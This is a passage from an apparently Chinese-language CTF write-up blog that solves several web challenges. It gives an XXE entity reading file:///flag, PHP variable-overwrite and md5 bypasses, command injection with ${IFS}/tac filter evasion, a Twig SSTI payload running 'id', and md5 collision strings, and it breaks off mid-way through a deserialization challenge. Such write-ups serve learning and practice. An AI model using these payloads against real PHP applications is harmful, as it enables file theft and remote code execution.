+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY test SYSTEM &#34;file:///flag&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;user&gt;&lt;username&gt;</span>&amp;test;<span style="color:#f92672">&lt;/username&gt;&lt;password&gt;</span>1<span style="color:#f92672">&lt;/password&gt;&lt;/user&gt;</span>
+</span></span></code></pre></div><h1 id="gwctf-2019我有一个数据库">[GWCTF 2019]我有一个数据库</h1>
+<p>啥也没有，扫一下目录，发现有phpmyadmin，进去也是啥也没有</p>
+<p>可能是phpmyadmin本身有漏洞，直接google到POC，但我没找到，开xray扫出来了。。。</p>
+<p>![image-20240309111211220](/Users/fanbig/Library/Application Support/typora-user-images/image-20240309111211220.png)</p>
+<p>文件包含漏洞，直接读取flag</p>
+<h2 id="bjdctf2020mark-loves-cat">[BJDCTF2020]Mark loves cat</h2>
+<p>githack</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;flag.php&#39;</span>;
+</span></span><span style="display:flex;"><span>$yds <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dog&#34;</span>;
+</span></span><span style="display:flex;"><span>$is <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cat&#34;</span>;
+</span></span><span style="display:flex;"><span>$handsome <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;yds&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($_POST <span style="color:#66d9ef">as</span> $x <span style="color:#f92672">=&gt;</span> $y) {
+</span></span><span style="display:flex;"><span>    $$x <span style="color:#f92672">=</span> $y;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($_GET <span style="color:#66d9ef">as</span> $x <span style="color:#f92672">=&gt;</span> $y) {
+</span></span><span style="display:flex;"><span>    $$x <span style="color:#f92672">=</span> $$y;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($_GET <span style="color:#66d9ef">as</span> $x <span style="color:#f92672">=&gt;</span> $y) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($_GET[<span style="color:#e6db74">&#39;flag&#39;</span>] <span style="color:#f92672">===</span> $x <span style="color:#f92672">&amp;&amp;</span> $x <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;flag&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>($handsome);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;flag&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;flag&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>($yds);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_POST[<span style="color:#e6db74">&#39;flag&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;flag&#39;</span>  <span style="color:#f92672">||</span> $_GET[<span style="color:#e6db74">&#39;flag&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;flag&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>($is);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;the flag is: &#34;</span> <span style="color:#f92672">.</span> $flag;
+</span></span></code></pre></div><p>payload</p>
+<pre tabindex="0"><code>index.php?yds=flag
+</code></pre><h2 id="wustctf2020朴实无华">[WUSTCTF2020]朴实无华</h2>
+<p>啥也没有，目录扫描，得到robots.txt和一个fake_flag.php，fake_flag.php响应报文中有另一个文件内容，如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-type:text/html;charset=utf-8&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__file__</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//level 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;num&#39;</span>])){
+</span></span><span style="display:flex;"><span>    $num <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;num&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">intval</span>($num) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2020</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">intval</span>($num <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2021</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;金钱解决不了穷人的本质问题&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;去非洲吧&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//level 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;md5&#39;</span>])){
+</span></span><span style="display:flex;"><span>   $md5<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;md5&#39;</span>];
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> ($md5<span style="color:#f92672">==</span><span style="color:#a6e22e">md5</span>($md5))
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&#34;</span>);
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;去非洲吧&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//get flag
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;get_flag&#39;</span>])){
+</span></span><span style="display:flex;"><span>    $get_flag <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;get_flag&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">strstr</span>($get_flag,<span style="color:#e6db74">&#34; &#34;</span>)){
+</span></span><span style="display:flex;"><span>        $get_flag <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_ireplace</span>(<span style="color:#e6db74">&#34;cat&#34;</span>, <span style="color:#e6db74">&#34;wctf2020&#34;</span>, $get_flag);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>($get_flag);
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;快到非洲了&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;去非洲吧&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>level1用科学记数法绕过，因为php版本为5.5，payload</p>
+<pre tabindex="0"><code>/fl4g.php?num=1e5
+</code></pre><p>level2经典绕过，payload</p>
+<pre tabindex="0"><code>/fl4g.php?num=1e5&amp;md5=0e215962017
+</code></pre><p>level3空格绕过，用${IFS}或者$IFS$1绕过，cat也被过滤，可以用tac查看，payload</p>
+<pre tabindex="0"><code>/fl4g.php?num=1e5&amp;md5=0e215962017&amp;get_flag=tac${IFS}./fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
+</code></pre><h1 id="bjdctf2020cookie-is-so-stable">[BJDCTF2020]Cookie is so stable</h1>
+<p>SSTI</p>
+<p>直接FUZZ</p>
+<pre tabindex="0"><code>{{_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}{{_self.env.getFilter(&#34;id&#34;)}}
+</code></pre><h2 id="安洵杯-2019easy_web">[安洵杯 2019]easy_web</h2>
+<pre tabindex="0"><code>GET /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd= HTTP/1.1
+</code></pre><p>观察URL，先解码img内容，</p>
+<p>![image-20240309162624969](/Users/fanbig/Library/Application Support/typora-user-images/image-20240309162624969.png)</p>
+<p>可以知道先两次base64，再一次hex，得到网页上显示的图片，根据这个信息，我们可以通过这个方式把网站源码也经过这种方式回显出来</p>
+<p>![image-20240309162921129](/Users/fanbig/Library/Application Support/typora-user-images/image-20240309162921129.png)</p>
+<pre tabindex="0"><code>GET /index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd= HTTP/1.1
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">HTTP/1.1 200 OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Server</span>: <span style="color:#ae81ff">openresty</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Date</span>: <span style="color:#ae81ff">Sat, 09 Mar 2024 08:30:04 GMT</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Type</span>: <span style="color:#ae81ff">text/html;charset=utf-8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Length</span>: <span style="color:#ae81ff">1955</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Connection</span>: <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Vary</span>: <span style="color:#ae81ff">Accept-Encoding</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">X-Powered-By</span>: <span style="color:#ae81ff">PHP/7.1.33</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Cache-Control</span>: <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">cache</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;img src=&#39;data:image/gif;base64,PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4=&#39;&gt;&lt;/img&gt;&lt;br&gt;&lt;br&gt;md5 is funny ~&lt;html&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;style&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">body{</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">background:url(./bj.png)  no-repeat center center;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">background-size:cover;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">background-attachment:fixed;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">background-color:#CCCCCC;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;/style&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;body&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;/body&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">&lt;/html&gt;</span>
+</span></span></code></pre></div><p>解码回显的内容，得到</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#66d9ef">E_ALL</span> <span style="color:#f92672">||</span> <span style="color:#f92672">~</span><span style="color:#a6e22e">E_NOTICE</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;content-type:text/html;charset=utf-8&#39;</span>);
+</span></span><span style="display:flex;"><span>$cmd <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;img&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]))
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;</span>);
+</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex2bin</span>(<span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">base64_decode</span>($_GET[<span style="color:#e6db74">&#39;img&#39;</span>])));
+</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/[^a-zA-Z0-9.]+/&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $file);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/i&#34;</span>, $file)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;img src =&#34;./ctf3.jpeg&#34;&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;xixiï½ no flag&#34;</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    $txt <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>($file));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;img src=&#39;data:image/gif;base64,&#34;</span> <span style="color:#f92672">.</span> $txt <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39;&gt;&lt;/img&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $cmd;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">|\`|;|,|\*|\?|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\xA0</span><span style="color:#e6db74">|\{|\}|\(|\)|\&amp;[^\d]|@|\||</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&#34;</span>, $cmd)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> (<span style="color:#e6db74">&#34;forbid ~&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">string</span>)$_POST[<span style="color:#e6db74">&#39;a&#39;</span>] <span style="color:#f92672">!==</span> (<span style="color:#a6e22e">string</span>)$_POST[<span style="color:#e6db74">&#39;b&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;a&#39;</span>]) <span style="color:#f92672">===</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;b&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">`$cmd`</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> (<span style="color:#e6db74">&#34;md5 is funny ~&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以知道过滤了很多命令，而且只需要一个md5的强比较绕过就行，payload</p>
+<pre tabindex="0"><code>a=M%C9h%FF%0E%E3%5C+%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
+&amp;
+b=M%C9h%FF%0E%E3%5C+%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
+</code></pre><p>现在就可以执行命令了，要读取flag还要绕过preg_match()，paylaod</p>
+<pre tabindex="0"><code>/index.php?cmd=ca\t+/flag
+</code></pre><h2 id="mrctf2020ezpop">[MRCTF2020]Ezpop</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//flag is in flag.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//WTF IS THIS?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//And Crack It!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Modifier</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span>  $var;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">append</span>($value)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span>($value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __invoke()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">append</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">var</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Show</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $source;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;index.php&#39;</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> $file;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Welcome to &#39;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;hacker&#34;</span>;
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.php&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $p;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __get($key)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $function <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">p</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $function();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;pop&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#a6e22e">unserialize</span>($_GET[<span style="color:#e6db74">&#39;pop&#39;</span>]);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
